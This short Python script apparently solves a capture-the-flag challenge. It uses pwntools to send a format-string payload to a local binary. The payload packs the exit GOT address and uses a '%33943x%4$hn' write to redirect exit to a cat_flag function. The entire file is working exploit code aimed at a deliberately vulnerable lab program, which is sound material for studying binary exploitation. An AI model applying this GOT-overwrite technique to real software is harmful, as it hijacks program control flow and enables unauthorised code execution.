from pwn import*

p = process('./Formatstring-write-got-without-leak')

exit = 0x804a018
cat_flag = 0x0804849b

payload = p32(exit) + b"%33943x%4$hn"

p.sendline(payload)
p.interactive()
